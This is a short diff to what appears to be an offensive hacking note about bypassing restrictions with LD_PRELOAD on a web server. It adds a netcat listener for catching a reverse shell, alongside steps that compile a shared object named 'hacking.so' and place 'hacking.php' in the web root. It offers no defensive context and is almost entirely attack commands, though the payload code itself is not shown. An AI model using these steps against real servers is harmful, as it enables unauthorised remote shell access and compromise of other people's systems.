@@ -1,6 +1,6 @@
 # Testing By Pass LD_PRELOAD
 
-Source : xcode.co.id
+NetCat Reverse Shell
 --------
 ```
 #Build Config
@@ -10,4 +10,7 @@ gcc -shared hacking -o hacking.so
 
 #ByPass via BadConnect
 nano /var/www/html/hacking.php
+
+#NetCat
+nc -v -l -p [PORT]
 ```
